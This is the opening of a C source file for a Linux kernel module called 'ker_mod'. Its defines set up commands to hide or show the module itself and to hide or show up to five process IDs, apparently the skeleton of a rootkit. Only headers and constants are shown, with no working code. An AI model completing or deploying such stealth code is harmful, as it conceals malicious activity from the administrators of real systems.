#include <linux/module.h>
#include <linux/proc_fs.h>
#include <asm/uaccess.h>
/* WTF, it compiles without these */
//#include <linux/kernel.h>
//#include <linux/init.h>
//#include <linux/kobject.h>
//#include <linux/fs.h>
//#include <linux/string.h>
//#include <linux/proc_ns.h>
//#include <linux/spinlock.h>
//#include <linux/atomic.h>
//#include <linux/binfmts.h>
//#include <linux/cred.h>

MODULE_LICENSE("GPL");

#define MODULE_NAME "ker_mod"
#define MAX_HIDDEN_PIDS 5
#define MAX_PID_LENGTH 6

#define HIDE_MOD_CMD "hide"
#define SHOW_MOD_CMD "show"
#define HIDE_PID_CMD "hpid"
#define SHOW_PID_CMD "spid"

